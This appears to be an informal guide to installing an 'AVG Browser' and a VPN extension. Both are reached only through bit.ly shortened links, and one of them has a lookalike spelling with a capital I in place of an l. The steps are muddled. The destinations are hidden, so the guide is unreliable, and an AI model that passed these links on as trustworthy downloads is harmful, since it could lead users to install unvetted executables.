AVG Browser

To install, go to https://bit.ly/DownnIoad and download the browser. Open it, download it, find the AVG browser exe, then go to this extension, https://bit.ly/VPNs, and add the extension. Once you add it, go to your extensions and click on it, connect to the default selected country. Once you connect, go back and make sure it's connected. If it still says connected, you are good to go. If it's not connected, then you must click connect again and check again. Out of time? Remove the extension and re-add it.
